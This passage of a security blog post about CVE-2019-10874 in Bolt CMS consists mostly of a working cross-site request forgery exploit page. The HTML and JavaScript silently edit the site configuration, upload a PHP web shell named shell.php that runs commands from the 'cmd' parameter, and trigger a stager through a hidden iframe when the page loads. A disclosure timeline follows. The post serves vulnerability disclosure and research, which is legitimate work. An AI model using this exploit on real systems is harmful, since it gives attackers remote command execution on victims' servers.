class="s2">'beta</span><span class="se">\\\</span><span class="s2">'%2C+or+</span><span class="se">\\\</span><span class="s2">'dev</span><span class="se">\\\</span><span class="s2">'.+Setting+</span><span class="se">\\\</span><span class="s2">'dev</span><span class="se">\\\</span><span class="s2">'+will+allow+you+to+install+dev-master+versions+of+extensions.%0D%0A%23+++++++++prefer-stable%3A+true++++++++++++%23+Prefer+stable+releases+over+development+ones%0D%0A%23+++++++++prefer-dist%3A+true++++++++++++++%23+Forces+installation+from+package+dist+even+for+dev+versions.%0D%0A%23+++++++++prefer-source%3A+false+++++++++++%23+Forces+installation+from+package+sources+when+possible%2C+including+VCS+information.%0D%0A%23+++++++++config%3A%0D%0A%23+++++++++++++optimize-autoloader%3A+false+++++%23+Optimize+autoloader+during+autoloader+dump.%0D%0A%23+++++++++++++classmap-authoritative%3A+false++%23+Autoload+classes+from+the+classmap+only.+Implicitly+enables+%60optimize-autoloader%60.%0D%0A%0D%0A%23+Enforcing+the+use+of+SSL.+If+set%2C+all+pages+will+enforce+an+SSL+connection%2C%0D%0A%23+and+redirect+to+HTTPS+if+you+attempt+to+visit+plain+HTTP+pages.%0D%0A%23+enforce_ssl%3A+true%0D%0A%0D%0A%23+If+configured%2C+Bolt+will+trust+X-Forwarded-XXX+headers+from+the+listed+IP%0D%0A%23+addresses+and+ranges+when+determining+whether+the+current+request+is%0D%0A%23+</span><span class="se">\\\</span><span class="s2">'secure</span><span class="se">\\\</span><span class="s2">'.%0D%0A%23%0D%0A%23+This+is+required+to+correctly+determine+the+current+hostname+and+protocol%0D%0A%23+(HTTP+vs.+HTTPS)+when+running+behind+some+proxy%2C+e.g.+a+load+balancer%2C+cache%2C%0D%0A%23+or+SSL+proxy.%0D%0A%23%0D%0A%23+List+the+IP+addresses+or+subnets+that+you+know+are+such+proxies.%0D%0A%23%0D%0A%23+Note%3A+Allowing+hosts+here+that+may+not+be+trusted+proxies+is+a+security+risk.%0D%0A%23+++++++If+you+do+not+understand+what+this+does%2C+it+is+probably+best+to+not%0D%0A%23+++++++touch+it.%0D%0A%23+trustProxies%3A%0D%0A%23+++++-+127.0.0.1%0D%0A%23+++++-+10.0.0.0%2F8%0D%0A%0D%0A%23+If+you+want+Bolt+installation+get+news+through+a+proxy%0D%0A%23+httpProxy%3A%0D%0A%23+++++host%3A+scheme%3A%2F%2Fmy.proxy.server%3Aport%0D%0A%23+++++user%3A+%5Busr%5D%0D%0A%23+++++password%3A+%5Bpwd%5D%0D%0A%0D%0A%23+Options+for+backend+user+interface%0D%0A%23+backend%3A%0D%0A%23++++news%3A%0D%0A%23++++++++disable%3A+true+++++%23+Disable+news+panel.+Defaults+to+false.+%22Alerts%22+will+still+be+shown.%0D%0A%23++++stack%3A%0D%0A%23++++++++disable%3A+true+++++%23+Disable+stack+usage.+Defaults+to+false.%0D%0A%0D%0A%23+Options+that+will+be+forced+in+next+major+version%0D%0Acompatibility%3A%0D%0A++++%23+Whether+to+return+TemplateView+instead+of+TemplateResponse+from+Controller%5CBase%3A%3Arender()%0D%0A++++%23+Response+methods+cannot+be+used+on+TemplateView+objects.%0D%0A++++%23+Setting+this+value+to+false+is+deprecated.%0D%0A++++template_view%3A+true%0D%0A++++%23+Set+to+</span><span class="se">\\\</span><span class="s2">'false</span><span class="se">\\\</span><span class="s2">'+to+enable+using+a+newer+version+of+the+setcontent+parser.%0D%0A++++setcontent_legacy%3A+true%0D%0A&amp;file_edit%5Bsave%5D=undefined</span><span class="se">\\</span><span class="s2">n</span><span class="se">\"</span><span class="s2">;</span><span class="se">\r\n</span><span class="dl">"</span> <span class="o">+</span> 
          <span class="dl">"</span><span class="s2">            var aBody = new Uint8Array(body.length);</span><span class="se">\r\n</span><span class="dl">"</span> <span class="o">+</span> 
          <span class="dl">"</span><span class="s2">            for (var i = 0; i </span><span class="se">\</span><span class="s2">x3c aBody.length; i++)</span><span class="se">\r\n</span><span class="dl">"</span> <span class="o">+</span> 
          <span class="dl">"</span><span class="s2">              aBody[i] = body.charCodeAt(i); </span><span class="se">\r\n</span><span class="dl">"</span> <span class="o">+</span> 
          <span class="dl">"</span><span class="s2">            xhr.send(new Blob([aBody]));</span><span class="se">\r\n</span><span class="dl">"</span> <span class="o">+</span> 
          <span class="dl">"</span><span class="s2">        }</span><span class="se">\r\n</span><span class="dl">"</span> <span class="o">+</span> 
          <span class="dl">"</span><span class="se">\r\n</span><span class="dl">"</span> <span class="o">+</span> 
          <span class="dl">"</span><span class="s2">        function UploadShell() {</span><span class="se">\r\n</span><span class="dl">"</span> <span class="o">+</span> 
          <span class="dl">"</span><span class="s2">            var xhr = new XMLHttpRequest();</span><span class="se">\r\n</span><span class="dl">"</span> <span class="o">+</span> 
          <span class="dl">"</span><span class="s2">            xhr.open(</span><span class="se">\"</span><span class="s2">POST</span><span class="se">\"</span><span class="s2">, bolt_admin_url + </span><span class="se">\"</span><span class="s2">/upload</span><span class="se">\"</span><span class="s2">, true);</span><span class="se">\r\n</span><span class="dl">"</span> <span class="o">+</span> 
          <span class="dl">"</span><span class="s2">            xhr.setRequestHeader(</span><span class="se">\"</span><span class="s2">Accept</span><span class="se">\"</span><span class="s2">, </span><span class="se">\"</span><span class="s2">application</span><span class="se">\\</span><span class="s2">/json, text</span><span class="se">\\</span><span class="s2">/javascript, *</span><span class="se">\\</span><span class="s2">/*; q=0.01</span><span class="se">\"</span><span class="s2">);</span><span class="se">\r\n</span><span class="dl">"</span> <span class="o">+</span> 
          <span class="dl">"</span><span class="s2">            xhr.setRequestHeader(</span><span class="se">\"</span><span class="s2">Accept-Language</span><span class="se">\"</span><span class="s2">, </span><span class="se">\"</span><span class="s2">en-US,en;q=0.5</span><span class="se">\"</span><span class="s2">);</span><span class="se">\r\n</span><span class="dl">"</span> <span class="o">+</span> 
          <span class="dl">"</span><span class="s2">            xhr.setRequestHeader(</span><span class="se">\"</span><span class="s2">Content-Type</span><span class="se">\"</span><span class="s2">, </span><span class="se">\"</span><span class="s2">multipart</span><span class="se">\\</span><span class="s2">/form-data; boundary=---------------------------130713229751679908527494159</span><span class="se">\"</span><span class="s2">);</span><span class="se">\r\n</span><span class="dl">"</span> <span class="o">+</span> 
          <span class="dl">"</span><span class="s2">            xhr.withCredentials = true;</span><span class="se">\r\n</span><span class="dl">"</span> <span class="o">+</span> 
          <span class="dl">"</span><span class="s2">            var body = </span><span class="se">\"</span><span class="s2">-----------------------------130713229751679908527494159</span><span class="se">\\</span><span class="s2">r</span><span class="se">\\</span><span class="s2">n</span><span class="se">\"</span><span class="s2"> + </span><span class="se">\r\n</span><span class="dl">"</span> <span class="o">+</span> 
          <span class="dl">"</span><span class="s2">              </span><span class="se">\"</span><span class="s2">Content-Disposition: form-data; name=</span><span class="se">\\\"</span><span class="s2">files[]</span><span class="se">\\\"</span><span class="s2">; filename=</span><span class="se">\\\"</span><span class="s2">shell.php</span><span class="se">\\\"\\</span><span class="s2">r</span><span class="se">\\</span><span class="s2">n</span><span class="se">\"</span><span class="s2"> + </span><span class="se">\r\n</span><span class="dl">"</span> <span class="o">+</span> 
          <span class="dl">"</span><span class="s2">              </span><span class="se">\"</span><span class="s2">Content-Type: text/plain</span><span class="se">\\</span><span class="s2">r</span><span class="se">\\</span><span class="s2">n</span><span class="se">\"</span><span class="s2"> + </span><span class="se">\r\n</span><span class="dl">"</span> <span class="o">+</span> 
          <span class="dl">"</span><span class="s2">              </span><span class="se">\"\\</span><span class="s2">r</span><span class="se">\\</span><span class="s2">n</span><span class="se">\"</span><span class="s2"> + </span><span class="se">\r\n</span><span class="dl">"</span> <span class="o">+</span> 
          <span class="dl">"</span><span class="s2">              </span><span class="se">\"\\</span><span class="s2">x3c?php echo(system($_GET[</span><span class="se">\\\</span><span class="s2">'cmd</span><span class="se">\\\</span><span class="s2">'])); ?</span><span class="se">\\</span><span class="s2">x3e</span><span class="se">\\</span><span class="s2">n</span><span class="se">\"</span><span class="s2"> + </span><span class="se">\r\n</span><span class="dl">"</span> <span class="o">+</span> 
          <span class="dl">"</span><span class="s2">              </span><span class="se">\"\\</span><span class="s2">r</span><span class="se">\\</span><span class="s2">n</span><span class="se">\"</span><span class="s2"> + </span><span class="se">\r\n</span><span class="dl">"</span> <span class="o">+</span> 
          <span class="dl">"</span><span class="s2">              </span><span class="se">\"</span><span class="s2">-----------------------------130713229751679908527494159--</span><span class="se">\\</span><span class="s2">r</span><span class="se">\\</span><span class="s2">n</span><span class="se">\"</span><span class="s2">;</span><span class="se">\r\n</span><span class="dl">"</span> <span class="o">+</span> 
          <span class="dl">"</span><span class="s2">            var aBody = new Uint8Array(body.length);</span><span class="se">\r\n</span><span class="dl">"</span> <span class="o">+</span> 
          <span class="dl">"</span><span class="s2">            for (var i = 0; i </span><span class="se">\</span><span class="s2">x3c aBody.length; i++)</span><span class="se">\r\n</span><span class="dl">"</span> <span class="o">+</span> 
          <span class="dl">"</span><span class="s2">              aBody[i] = body.charCodeAt(i); </span><span class="se">\r\n</span><span class="dl">"</span> <span class="o">+</span> 
          <span class="dl">"</span><span class="s2">            xhr.send(new Blob([aBody]));</span><span class="se">\r\n</span><span class="dl">"</span> <span class="o">+</span> 
          <span class="dl">"</span><span class="s2">        }</span><span class="se">\r\n</span><span class="dl">"</span> <span class="o">+</span> 
          <span class="dl">"</span><span class="s2">    }</span><span class="se">\r\n</span><span class="dl">"</span> <span class="o">+</span> 
          <span class="dl">"</span><span class="se">\r\n</span><span class="dl">"</span> <span class="o">+</span> 
          <span class="dl">"</span><span class="s2">    exploit();</span><span class="se">\r\n</span><span class="dl">"</span> <span class="o">+</span> 
          <span class="dl">"</span><span class="se">\r\n</span><span class="dl">"</span> <span class="o">+</span> 
          <span class="dl">"</span><span class="se">\</span><span class="s2">x3c/script</span><span class="se">\</span><span class="s2">x3e</span><span class="se">\r\n</span><span class="dl">"</span> <span class="o">+</span> 
          <span class="dl">"</span><span class="se">\n</span><span class="dl">"</span> <span class="o">+</span> 
          <span class="dl">"</span><span class="se">\r\n</span><span class="dl">"</span> <span class="o">+</span> 
          <span class="dl">"</span><span class="s2">-----------------------------130713229751679908527494159--</span><span class="se">\r\n</span><span class="dl">"</span><span class="p">;</span>
        <span class="kd">var</span> <span class="nx">aBody</span> <span class="o">=</span> <span class="k">new</span> <span class="nb">Uint8Array</span><span class="p">(</span><span class="nx">body</span><span class="p">.</span><span class="nx">length</span><span class="p">);</span>
        <span class="k">for</span> <span class="p">(</span><span class="kd">var</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="nx">aBody</span><span class="p">.</span><span class="nx">length</span><span class="p">;</span> <span class="nx">i</span><span class="o">++</span><span class="p">)</span>
          <span class="nx">aBody</span><span class="p">[</span><span class="nx">i</span><span class="p">]</span> <span class="o">=</span> <span class="nx">body</span><span class="p">.</span><span class="nx">charCodeAt</span><span class="p">(</span><span class="nx">i</span><span class="p">);</span> 
        <span class="nx">xhr</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="k">new</span> <span class="nx">Blob</span><span class="p">([</span><span class="nx">aBody</span><span class="p">]));</span>

        <span class="nx">setTimeout</span><span class="p">(</span><span class="kd">function</span><span class="p">()</span> <span class="p">{</span>
            <span class="kd">var</span> <span class="nx">dateObj</span> <span class="o">=</span> <span class="k">new</span> <span class="nb">Date</span><span class="p">();</span>
            <span class="kd">var</span> <span class="nx">folder</span> <span class="o">=</span> <span class="nx">dateObj</span><span class="p">.</span><span class="nx">getFullYear</span><span class="p">()</span> <span class="o">+</span> <span class="dl">"</span><span class="s2">-</span><span class="dl">"</span> <span class="o">+</span> <span class="p">(</span><span class="nb">String</span><span class="p">(</span><span class="dl">"</span><span class="s2">00</span><span class="dl">"</span><span class="o">+</span><span class="p">(</span><span class="nx">dateObj</span><span class="p">.</span><span class="nx">getMonth</span><span class="p">()</span><span class="o">+</span><span class="mi">1</span><span class="p">)).</span><span class="nx">slice</span><span class="p">(</span><span class="o">-</span><span class="mi">2</span><span class="p">));</span>
            <span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="dl">'</span><span class="s1">stager</span><span class="dl">'</span><span class="p">).</span><span class="nx">src</span> <span class="o">=</span> <span class="nx">target</span> <span class="o">+</span> <span class="dl">"</span><span class="s2">/files/</span><span class="dl">"</span><span class="o">+</span><span class="nx">folder</span><span class="o">+</span><span class="dl">"</span><span class="s2">/stager.html</span><span class="dl">"</span><span class="p">;</span>
            <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="dl">"</span><span class="s2">Called stager! Wait a moment and access: </span><span class="dl">"</span> <span class="o">+</span> <span class="nx">target</span> <span class="o">+</span> <span class="dl">"</span><span class="s2">/files/</span><span class="dl">"</span> <span class="o">+</span> <span class="nx">folder</span> <span class="o">+</span> <span class="dl">"</span><span class="s2">/shell.php?cmd=whoami</span><span class="dl">"</span><span class="p">);</span>
         <span class="p">},</span> <span class="mi">2000</span><span class="p">);</span>

      <span class="p">}</span>

      <span class="nb">window</span><span class="p">.</span><span class="nx">onload</span> <span class="o">=</span> <span class="kd">function</span><span class="p">()</span> <span class="p">{</span>
        <span class="nx">exploit</span><span class="p">();</span>
      <span class="p">};</span>

    <span class="nt">&lt;/script&gt;</span>
     <span class="nt">&lt;iframe</span> <span class="na">id=</span><span class="s">"stager"</span> <span class="na">style=</span><span class="s">"width:0;height:0;border:0;border:none"</span> <span class="na">src=</span><span class="s">""</span><span class="nt">&gt;&lt;/iframe&gt;</span>
  <span class="nt">&lt;/body&gt;</span>
<span class="nt">&lt;/html&gt;</span>

</pre></table></code></div></div><h2 id="disclosure-timeline">Disclosure Timeline</h2><ul><li>2019/04/02 - Vulnerabilities Discovered<li>2019/04/03 - Vulnerabilities Reported to Bolt CMS (CVE-2019-10874)<li>2019/04/03 - Developer Acknowledged Vulnerability and started to address issues (first <a href="https://github.com/bolt/bolt/pull/7768/commits/91187aef36363a870d60b0a3c1bf8507af34c9e4">Pull</a>)<li>2019/04/11 - Version 3.6.7 released (<a href="https://github.com/bolt/bolt/releases/tag/v3.6.7">link</a>)</ul></div><div class="post-tail-wrapper text-muted"><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=From CSRF to RCE - Fgsec&url=https://fgsec.net/posts/From-CSRF-to-RCE/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=From CSRF to RCE - Fgsec&u=https://fgsec.net/posts/From-CSRF-to-RCE/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://telegram.me/share?text=From CSRF to RCE - Fgsec&url=https://fgsec.net/posts/From-CSRF-to-RCE/" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i class="fa-fw fas fa-link small" onclick="copyLink()" data-toggle="tooltip" data-placement="top" title="Copy link"></i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted topbar-down"><div class="access"><div id="access-lastmod" class="post"> <span>Recent Update</span><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/Dynamically-resolving-syscalls-in-CSharp/">Dynamically resolving syscalls in C#</a><li><a href="/posts/Bypass-Upload-Restrictions-and-Evade-Detection/">Bypass Upload Restrictions and Evade Detection</a><li><a href="/posts/Injecting-dotNet-Assemblies-To-Unmanaged-Processes/">Injecting dotNet Assemblies to Unmanaged Processes</a><li><a href="/posts/From-CSRF-to-RCE/">From CSRF to RCE</a><li><a href="/posts/New-Blog-Again/">New blog again</a></ul></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"> <span class="pl-3 pt-2 mb-2">Contents</span><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="post-extend-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/Dynamically-resolving-syscalls-in-CSharp/"><div class="card-body"> <span class="timeago small" > May 4 <i class="unloaded">2021-05-04T13:00:00-03:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Dynamically resolving syscalls in C#</h3><div class="text-muted small"><p> This post aims to describe and provide example code on how you can dynamically resolve syscalls using only C#. What are System calls? TL;DR: System calls or just syscalls are used by applications...</p></div></div></a></div><div class="card"> <a href="/posts/Injecting-dotNet-Assemblies-To-Unmanaged-Processes/"><div class="card-body"> <span class="timeago small" > Feb 9 <i class="unloaded">2021-02-09T13:00:00-03:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Injecting dotNet Assemblies to Unmanaged Processes</h3><div class="text-muted small"><p> This is a quick post to show how you can inject your .NET assembly code to unmanaged processes. Generate the ShellCode As an example, I will be using a Mythic implant. But feel free to develop yo...</p></div></div></a></div><div class="card"> <a href="/posts/Bypass-Upload-Restrictions-and-Evade-Detection/"><div class="card-body"> <span class="timeago small" > Jan 22 <i class="unloaded">2021-01-22T13:00:00-03:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Bypass Upload Restrictions and Evade Detection</h3><div class="text-muted small"><p> Let’s be honest, bypassing upload restrictions is not something new and usually involves different methods to achieve the same goal: execute your 1337 code on your victim; But you can’t always do t...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/New-Blog-Again/" class="btn btn-outline-primary" prompt="Older"><p>New blog again</p></a> <a href="/posts/Bypass-Upload-Restrictions-and-Evade-Detection/" class="btn btn-outline-primary" prompt="Newer"><p>Bypass Upload Restrictions and Evade Detection</p></a></div></div></div></div><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lozad/dist/lozad.min.js"></script> <script type="text/javascript"> const imgs = document.querySelectorAll('.post-content img'); const observer = lozad(imgs); observer.observe(); </script><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center"><div class="footer-left"><p class="mb-0"> © 2021 <a href="https://twitter.com/felipegaspar">Felipe Gaspar</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><h4 class="text-muted mb-4">Trending Tags</h4></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.7.3/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="https://fgsec.net{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script>
